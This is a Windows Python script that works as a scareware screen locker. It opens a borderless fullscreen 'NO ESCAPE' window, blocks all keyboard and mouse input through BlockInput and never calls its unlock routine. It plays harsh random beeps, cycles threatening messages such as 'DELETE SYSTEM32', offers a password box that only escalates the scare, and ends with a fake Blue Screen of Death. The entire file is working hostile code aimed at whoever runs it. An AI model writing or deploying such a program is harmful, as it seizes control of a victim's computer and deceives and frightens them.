import tkinter as tk
from tkinter import Entry, Label
import ctypes
import random
import winsound
import threading
import time

def lock_input():
    ctypes.windll.user32.BlockInput(True)

def unlock_input():
    ctypes.windll.user32.BlockInput(False)

# --- Horror Sound Effect ---
def play_terror_sound():
    def sound_loop():
        for _ in range(80):
            winsound.Beep(random.randint(600, 2500), random.randint(100, 300))
        winsound.Beep(30, 4000)
    threading.Thread(target=sound_loop, daemon=True).start()

# --- Lock Screen Setup ---
root = tk.Tk()
root.title("NO ESCAPE")
root.attributes("-fullscreen", True)
root.configure(bg="black")
root.overrideredirect(True)

# --- Creepy User List ---
users = ["UNKNOWN", "VOID ENTITY", "?????", "ERROR", "UNSEEN"]
user_labels = []
for i, user in enumerate(users):
    lbl = Label(root, text=user, font=("Courier", 20, "bold"), fg="red", bg="black")
    lbl.place(relx=0.02, rely=0.2 + i * 0.1)
    user_labels.append(lbl)

def glitch_users():
    for _ in range(30):
        for lbl in user_labels:
            lbl.config(text=random.choice(["UNKNOWN", "???", "SYSTEM GHOST", "VOID" + str(random.randint(1, 9))]))
        root.update()
        time.sleep(0.3)
    for lbl in user_labels:
        lbl.config(text="OBSERVER ACTIVE", fg="darkred")

# Red Icon Simulation
canvas = tk.Canvas(root, width=200, height=200, bg="black", highlightthickness=0)
canvas.place(relx=0.5, rely=0.3, anchor="center")
canvas.create_oval(10, 10, 190, 190, fill="red", outline="red")
canvas.create_text(100, 100, text="֎", font=("Arial", 100, "bold"), fill="black")

# Main Text
label = Label(root, text="NO ESCAPE", font=("Courier", 50, "bold"), fg="white", bg="black")
label.place(relx=0.5, rely=0.5, anchor="center")

# Password Field
password_entry = Entry(root, show="*", font=("Courier", 20), bg="white", fg="black", justify="center")
password_entry.place(relx=0.5, rely=0.6, anchor="center", width=300, height=40)

# --- BSOD Simulation ---
def show_bsod():
    # Clear all UI elements before showing BSOD
    for widget in root.winfo_children():
        widget.destroy()

    # Set the background to blue for BSOD
    root.configure(bg="blue")

    # BSOD Message
    bsod_text = (
        ":( Your PC ran into a problem and needs to restart.\n"
        "We're just collecting some error info, and then we'll restart for you.\n\n"
        "If you'd like to know more, you can search online later for this error: SYSTEM_THREAD_EXCEPTION_NOT_HANDLED"
    )

    # Create a label with the BSOD text
    bsod_label = Label(root, text=bsod_text, fg="white", bg="blue", font=("Courier", 24, "bold"), justify="center")
    bsod_label.place(relx=0.5, rely=0.5, anchor="center")

    # Update the screen to ensure text appears
    root.update()

    # Wait for 15 seconds before quitting
    time.sleep(15)
    root.quit()

# Extreme Horror Mode
def escalate_terror():
    label.config(text="☠️ SYSTEM LOCKDOWN ☠️", fg="red")
    winsound.Beep(100, 3000)
    root.configure(bg="black")
    glitch_users()
    
    # Fake system corruption with glitching text
    def glitch_text():
        scary_messages = ["SYSTEM FAILURE", "MALWARE EXECUTION", "DELETE SYSTEM32", "ETERNAL PRISON", "OBLIVION"]
        for _ in range(20):
            label.config(text=random.choice(scary_messages), fg=random.choice(["red", "darkred", "black"]))
            root.update()
            root.after(random.randint(100, 300))
        label.config(text="YOU WILL NEVER ESCAPE", fg="red")
    
    threading.Thread(target=glitch_text, daemon=True).start()
    root.after(60000, show_bsod)  # Show BSOD after 60 seconds

# Bind Enter Key
def on_enter(event=None):
    escalate_terror()
password_entry.bind("<Return>", on_enter)

lock_input()
root.mainloop()
